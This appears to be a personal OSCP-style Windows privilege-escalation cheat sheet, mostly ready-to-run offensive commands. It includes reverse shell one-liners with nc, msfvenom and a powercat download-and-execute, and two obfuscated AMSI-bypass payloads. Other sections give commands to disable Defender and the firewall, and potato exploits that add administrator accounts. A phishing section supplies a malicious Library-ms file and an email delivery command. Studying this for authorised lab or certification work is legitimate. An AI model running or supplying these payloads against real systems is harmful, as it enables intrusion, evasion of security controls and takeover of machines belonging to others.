# Windows PrivEsc

HKCU - Current User\
HKLM - Local Machine

{% embed url="https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html" %}
Whole picture + Weak Services
{% endembed %}

{% embed url="https://benheater.com/thm-windows-privesc/" %}
Watch all the registry nonsense
{% endembed %}

Host file -`C:\Windows\System32\drivers\etc\hosts`

## Legend

Because I want you to realize there's only so much you have to look into

### Situational Awareness

*

    ```
    - Username and hostname
    - Group memberships of the current user
    - Existing users and groups
    - Operating system, version and architecture [kernel exploits]
    - Network information
    - Installed applications
    - Running processes
    ```
* **PowerShell history**
* Hidden in Plain View \[.kdbx, all that stuff]
* PowerUp & WinPEAS (Includes Watson)
* Environment - juicy info here?

```
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### Abuse

* Service hijacking/Unquoted service path
* DLL hijacking
* Scheduled tasks
* Exploits for non-default installed apps (eg. LibreOffice, puTTY)

### Post Exploit

{% embed url="https://github.com/crazywifi/Enable-RDP-One-Liner-CMD" %}

This might solve most issues imho regarding new user creation

```
netsh advfirewall set allprofiles state off
```

## Commands

### Fundamentals

```
powershell -ep bypass
. .\Downloads\PowerView.ps1

Powershell history at: (for each user)
Get-History
(Get-PSReadlineOption).HistorySavePath
type <PS history save path>

systeminfo - (look for latest hotfixes patched)
wmic qfe - check patch history (wmi - windows management instrumentation command line quick fix engineering)
wmic logicaldisk get caption,description,providername

Run Command from the other shell
[CMD] cmd /c [command]
[PS] powershell -Command '[command]'

Copy
[CMD] copy [source] [dest]
[PS] Copy-Item [source] [dest] 

Move
[CMD] move [source] [dest]
[PS] Move-Item [source] [dest]

Hidden Files
[CMD] dir /A:H 
[PS] ls -force

findstr /B /C "string" - grep basically
where /R c:\windows bash.exe

dir /R [Watch out for ADS (Alternate data streams) - good way to hide data]
more < hm.txt:root.txt
```

### Reverse Shells

The only way to get arrows in the shell

`rlwrap nc -lnvp $port`

Adding powershell and cmd to PATH, some commands like whoami may not work without it

`set PATH=%PATH%C:\Windows\System32;C:\Windows\System32\WindowsPowerShell\v1.0;`

```
1. Powershell base64 encoded reverse shell works most of the time
2. nc64.exe best run via cmd or powershell first (eg. cmd.exe /c nc64.exe -e 192.168.45.233 8080 cmd)
For service overwriting
3. msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.233 LPORT=1338 -f exe -o rev.exe
4. if WebDAV enabled -> cadaver $ip [provide creds] and ftp style put revshell
```

### User & Network Enumeration

```
whoami /priv /groups
net user (lists users on system)
net user /domain (lists domain users)
net user $username - lists all relavant info of that user
net localgroup $groupname

ipconfig
arp -a
netstat -ano | findstr LISTENING
netstat -a -b
```

### AV Enumeration \[AMSI, AppLocker, Defender, UAC]

{% hint style="info" %}
Turn Real-Time Protection off
{% endhint %}

```
sc query windefend
sc query <query> see what services are running
netsh advfirewall firewall dump
netsh firewall show state/config

#Turn firewall off after admin compromise
[CMD] netsh advfirewall set allprofiles state off
[PS] Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
#Confirm
netsh advfirewall show allprofiles

#Disable Real-Time Monitoring from Defender
Set-MpPreference -DisableRealtimeMonitoring $true
```

{% code title="You prolly don't need this but the youngest OSCE said this work severytime so why not yfm" %}
```
# AMSI-Bypass #1:
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )

# AMSI-Bypass #2:
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
```
{% endcode %}

{% embed url="https://juggernaut-sec.com/applocker-bypass/" %}

### UAC

Recover privs of service account (`LOCAL SERVICE` or `NETWORK SERVICE)`

{% embed url="https://github.com/itm4n/FullPowers" %}

Incase RunasCS bypass UAC doesn't cut it, run this - uses fodhelper.exe

> Modify $program in the script to spawn a netcat reverse shell (assuming you uploaded nc.exe).

{% embed url="https://github.com/winscripting/UAC-bypass/tree/master" %}

{% embed url="https://kashish.gitbook.io/7/master/windows-privesc/uac-bypass" %}
Doing it manually
{% endembed %}

## Automated Enumeration

{% hint style="info" %}
Run these from a SMB network share or from memory and not transfer to disk so Defender is not triggered
{% endhint %}

{% embed url="https://ivanitlearning.wordpress.com/2020/04/06/windows-enumeration-winpeas-and-seatbelt/" %}
RUNNING WINPEAS FROM SHARED NETWORK TO AVOID DEFENDER AND TOUCH DISK
{% endembed %}

{% embed url="https://github.com/gladiatx0r/Powerless" %}
Legacy Windows machines without Powershell
{% endembed %}

## Passwords and Port Forwarding

```
plink.exe -l root -pw mysecretpassword 192.168.0.101 -R 8080:127.0.0.1:8080
```

Password exploits

*   Saved creds

    ```
    cmdkey /list
    runas /savecred /user:username C:\PrivEsc\reverse.exe
    runas /user:Administrator "nc.exe -e 192.168.45.233 8080 cmd"
    ```
* Registry - The registry can be searched for keys and values that contain the word "password":
* SAM (Security Account Manager)\
  SAM and SYSTEM can be found at `Windows/System32/config`
* Pass the hash - if `psexec` don't work, `smbexec.py` (half shell) or `wmiexec`

```
findstr "/si password *.txt (look for string "password" in any txt file) 
```

{% code title="Keepass Database" %}
```
kpcli -kdb CEH.kdbx ls --group CEH --entries 
show -f [entry_number]
```
{% endcode %}

## Service Exploits

* Insecure Service Permissions
* Unquoted Service Path&#x20;
* Weak Registry Permissions (If writable by the "NT AUTHORITY\INTERACTIVE" group (essentially all logged-on users)

```
. .\PowerUp.ps1; Invoke-AllChecks
icacls - ACL to files/directories [Confirm our write perms on that directory]
```

Unquoted Service Path - How Windows searches for the path

```
C:\Program.exe
C:\Program Files\Enterprise.exe
C:\Program Files\Enterprise Apps\Current.exe
C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
```

{% embed url="https://kashish.gitbook.io/7/master/windows-privesc/unquoted-service-path" %}

{% embed url="https://juggernaut-sec.com/weak-service-file-permissions/#PowerUp" %}

```
shutdown -r -t 1 [time interval and reboot flags]
```

## Processes

#### What Process/App is Running under a certain port - after netstat should you port forward (Skylark)

```
TCP
Get-Process -Id (Get-NetTCPConnection -LocalPort YourPortNumberHere).OwningProcess
UDP
Get-Process -Id (Get-NetUDPEndpoint -LocalPort YourPortNumberHere).OwningProcess
OR
netstat -a -b
```

> **-b** Displays the executable involved in creating each connection or listening port. In some cases well-known executables host multiple independent components, and in these cases the sequence of components involved in creating the connection or listening port is displayed. In this case the executable name is in \[] at the bottom, on top is the component it called, and so forth until TCP/IP was reached. Note that this option can be time-consuming and will fail unless you have sufficient permissions.

#### Scheduled Tasks aka Cronjobs

> We discovered an interesting file at `C:\Backup\` which alludes to a job that runs every five minutes. As mentioned before, I imagine it's a PowerShell script of some sort in the `C:\Users\Admin` folder, because I couldn't find any scheduled tasks (could be a permissions issue).

```
[CMD] schtasks /query	[Mention next run time and path used too for task]
[CMD] schtasks /query /fo LIST /v [Mentions which user process is runnin as too]
schtasks /query /tn "[Task Name]" /fo LIST /v [Returns all info about that particualr process]
[PS] Get-ScheduledTask [Does not mention next run time but path yes]
```

**PSPY Equivalent - just won't know which user is running it**

{% code title="Check recently created processes " %}
```
wmic process get Name,ProcessId,CreationDate
```
{% endcode %}

## DLL Injection

#### Phantom Hijacking

If we have write perms to any folder in PATH, we can write a custom DLL that will be loaded for specific processes (one for Win 10 and one for Win7/8, Juggernaut gotchu)

#### Procmon

Need admin privs, run any process and see what DLLs are opened and their corresponding actions and paths

> The filter consists of four conditions. Our goal is that Process Monitor only shows events related to the _FileZilla_ Process. We enter the following arguments: _Process Name_ as _Column_, _is_ as _Relation_, _filezilla.exe_ as _Value_, and _Include_ as _Action_. Once entered, we'll click on _Add_.

<div align="left"><figure><img src="../.gitbook/assets/image (51).png" alt=""><figcaption><p>Delete current logged events to see new data inputted</p></figcaption></figure></div>

> Going over the basic usage of [Procmon](https://concurrency.com/blog/procmon-basics/) we see that the operation _CreateFile_ is responsible for not only creating files but also accessing existing files. Let's try to expand our filters and list only _CreateFile_ operations which include the **TextShaping.dll** name in the Path. According to the public information on this vulnerability, this DLL is used to hijack the execution when the FileZilla FTP Client is started.

<div align="left"><figure><img src="../.gitbook/assets/image (52).png" alt=""><figcaption><p>If 'Path' not mentioned it's cool, this example they know exactly which DLL to look for that's why</p></figcaption></figure></div>

<figure><img src="../.gitbook/assets/image (53).png" alt=""><figcaption><p>Either insert new DLL where it show not found or replace the existing one</p></figcaption></figure>

{% embed url="https://github.com/fatalxs/oscp-cheatsheet/blob/main/13%20Common%20Payloads.md" %}
payload for service c file and DLL file
{% endembed %}

{% embed url="https://sirensecurity.io/blog/dllref/" %}
Locations of standard DLL files used in Windows
{% endembed %}

{% embed url="https://juggernaut-sec.com/dll-hijacking/" %}

{% hint style="info" %}
Access \[PG AD]
{% endhint %}

## Token Impersonation

Like cookies for your computer

* Delegate - created for logging into machine or RDP
* Impersonate - "non-interactive" such as attaching network drive or domain login script&#x20;

```
whoami /priv 
```

**getsystem** - Magic way to become Admin, DO NOT SPAM

{% embed url="https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/Get-System.ps1" %}

3 methods

* Named Pipe impersonation (In memory/admin)
* Named Pipe impersonation (Dropper/admin) - most risky, will be flagged by AV cus inserting dll into disk
* Token Impersonation (In memory/admin) - Needs SeDebugPriveleges

#### Potatoes

Check .NET version for GodPotato, does not miss at all just don't go for a revshell with it no point in getting a SYSTEM shell without 'whoami' for proof

```powershell
reg query "HKLM\SOFTWARE\Microsoft\Net Framework Setup\NDP" /s
```

* GodPotato &#x20;

```
.\GP.exe -cmd "net user /add jtrip jtrip"
.\GP.exe -cmd "net localgroup administrators jtrip /add"
.\RunasCs.exe "jtrip" 'jtrip' powershell.exe -r 192.168.45.187:9001
OR
impacket-psexec jtrip:jtrip@192.168.202.249 cmd.exe
```

* PrintSpoofer - .`\PrintSpoofer64.exe -i -c cmd`\
  `.\PrintSpoofer.exe -c "C:/programdata/rev.exe"`
* SweetPotato - `.\SweetPotato.exe -e EfsRpc -p C:\programdata\nc.exe -a "192.168.45.205 1234 -e cmd"`

For PrintSpoofer, confirm Print Spooler service

```
Get-Service Spooler
```

If you really need it tho (Use msfvenom payload if nc shell hangs)

`.\GP.exe -cmd "cmd /c C:\programdata\nc64.exe -t -e C:\Windows\System32\cmd.exe 192.168.45.205 8001"`

{% embed url="https://jlajara.gitlab.io/Potatoes_Windows_Privesc" %}
Explain how each potato works
{% endembed %}

For x86, JuicyPotato is the way?

{% embed url="https://medium.com/@Dpsypher/proving-grounds-practice-authby-96e74b36375a" %}

## Always Install Elevated

* Check if the `AlwaysInstallElevated` setting has been enabled

```powershell
reg query HKLM\Software\Policies\Microsoft\Windows\Installer
reg query HKCU\Software\Policies\Microsoft\Windows\Installer
```

* If either of those queries return `1`, can get an elevated shell
* Use `msfvenom` to create an `.msi` payload and run it on the target

```powershell
msfvenom -p windows/adduser USER=username PASS=password -f msi-nouac -o install.msi #No uac format
msfvenom -p windows/adduser USER=username PASS=password -f msi -o install.msi #Using the msiexec the uac wont be prompted
-p windows/x64/shell_reverse_tcp LHOST=192.168.45.233 LPORT=1338 [better tho]

msiexec /quiet /qn /i <path to msi>
```

## Registry <a href="#startup-applications" id="startup-applications"></a>

#### Weak Reg Perms

`accesschk` or WinPEAS though the former easier to identify, same principle as weak service permissions

{% embed url="https://www.hackingarticles.in/windows-privilege-escalation-weak-registry-permission/" %}

<figure><img src="../.gitbook/assets/image (54).png" alt=""><figcaption></figcaption></figure>

<div align="left"><figure><img src="../.gitbook/assets/image (55).png" alt="" width="491"><figcaption></figcaption></figure></div>

#### Hard Coded Creds (See BEN)

{% code overflow="wrap" %}
```
reg query HKLM /f password /t REG_SZ /s
[Go through all registries having value 'Password' (Case insensitive) and display plaintext values associated]

reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
```
{% endcode %}

{% embed url="https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#inside-the-registry" %}
Round 1 OSCP
{% endembed %}

## Startup Applications <a href="#startup-applications" id="startup-applications"></a>

Find Which User Runs a Process in Command Prompt

```
tasklist /V
```

```powershell
icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
```

PowerShell

* If `BUILTIN\Users` has `(F)`, we can add a payload there
* Use `msfvenom` to generate a reverse shell `exe` payload
* Put the payload in the folder
* Start a listener
* Wait for an admin to login

## Phishing (Macros & Libraries)

* MS-Library
* Word Files
* Straight up exe
* URL for phishing (GET & POST eg. password reset)

{% embed url="https://github.com/sevagas/macro_pack" %}
Obfuscating your macros and other stuff, i saw in an OSEP reddit post
{% endembed %}

{% embed url="https://0xdf.gitlab.io/2020/02/01/htb-re.html#prepare-document" %}

#### ms\_Library

<figure><img src="../.gitbook/assets/image (56).png" alt=""><figcaption></figcaption></figure>

```
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
    <name>@windows.storage.dll,-34582</name>
    <version>6</version>
    <isLibraryPinned>true</isLibraryPinned>
    <iconReference>imageres.dll,-1003</iconReference>
    <templateInfo>
        <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
    </templateInfo>
    <searchConnectorDescriptionList>
        <searchConnectorDescription>
            <isDefaultSaveLocation>true</isDefaultSaveLocation>
            <isSupported>false</isSupported>
            <simpleLocation>
                <url>http://192.168.45.158[CHANGE]</url>
            </simpleLocation>
        </searchConnectorDescription>
    </searchConnectorDescriptionList>
</libraryDescription>
```

This will point to a shortcut (.lnk file) that fetches and runs powercat hosted on 8000 with revshell listener at 8001

Shortcut with target as:

{% code overflow="wrap" %}
```
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.3:8000/powercat.ps1'); powercat -c 192.168.119.3 -p 4444 -e powershell"
```
{% endcode %}

This file will be hosted at 80 with `/home/jtripz/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/jtripz/webdav/`

```
sudo swaks --to jim@relia.com --from maildmz@relia.com --header 'Subject: Please check this spreadsheet' --header-X-Test "Header" --server 192.168.202.189  --attach @config.Library-ms
```

When you copy the ms-Library from your VM you pointing to your actual IP not the tun IP lmao that's why it didnt work

## Recycle Bin

View items in the bin innit

```
$shell = New-Object -ComObject Shell.Application
$recycleBin = $shell.Namespace(0xA)
$recycleBin.items() | Select-Object Name, Path

Restore deleted file

$recycleBin = (New-Object -ComObject Shell.Application).NameSpace(0xA)
$items = $recycleBin.Items()
$item = $items | Where-Object {$_.Name -eq "wapt-backup-sunday.7z"}
$documentsPath = [Environment]::GetFolderPath("Desktop")
$documents = (New-Object -ComObject Shell.Application).NameSpace($documentsPath)
$documents.MoveHere($item)
```

## Exe Analysis

dnSpy the GOAT

<div align="left"><figure><img src="../.gitbook/assets/image (57).png" alt="" width="563"><figcaption></figcaption></figure></div>

## Kernel Exploits

windows-exploit-suggester.py does bitsss (update db before using tho, run locally: feed it systeminfo data and it will run it against its db)

`systeminfo` output required, the git repo tells you how it's done

{% embed url="https://juggernaut-sec.com/kernel-exploits-part-2/" %}

MS10-059 and others very popular: focus on privelege escalation vulns mentioned&#x20;

{% embed url="https://github.com/SecWiki/windows-kernel-exploits" %}

### PEN Cheats

{% embed url="https://github.com/sickn3ss/exploits/tree/master/CVE-2023-29360/x64/Release" %}

{% embed url="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-29360" %}
OS versions affected by CVE-2023-29360 (Windows 10 and 11 affected) Watson won't pick this up
{% endembed %}

Reference build and version using wikipedia for corresponding OS&#x20;

{% embed url="https://en.wikipedia.org/wiki/Windows_11_version_history" %}
